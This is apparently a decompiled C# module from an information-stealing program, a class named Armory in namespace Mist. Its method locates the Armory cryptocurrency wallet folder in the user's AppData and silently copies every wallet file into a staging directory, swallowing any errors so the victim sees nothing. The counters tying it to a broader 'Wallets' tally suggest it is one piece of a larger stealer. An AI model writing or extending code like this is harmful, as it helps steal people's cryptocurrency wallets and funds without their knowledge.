using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000064 RID: 100
	internal class Armory
	{
		// Token: 0x0600027F RID: 639 RVA: 0x000122F0 File Offset: 0x000104F0
		public static void ArmoryStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Help.AppDate + "\\Armory\\"))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\Armory\\");
						fileInfo.CopyTo(directorypath + "\\Wallets\\Armory\\" + fileInfo.Name);
					}
					Armory.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000156 RID: 342
		public static int count;
	}
}
